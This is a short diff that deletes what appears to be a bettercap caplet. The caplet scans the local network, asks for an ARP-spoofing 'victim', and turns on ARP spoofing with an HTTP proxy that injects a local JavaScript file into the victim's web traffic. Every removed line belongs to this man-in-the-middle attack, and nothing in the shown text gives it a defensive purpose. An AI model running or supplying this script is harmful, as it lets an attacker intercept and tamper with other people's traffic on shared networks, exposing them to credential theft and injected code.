@@ -1,8 +1,0 @@
-#auto functions
-net.probe on
-sleep 5
-net.show
-read arp.spoof.targets Select ARP Target (victim):
-set http.proxy.injectjs ./java-script.js
-arp.spoof on
-http.proxy on
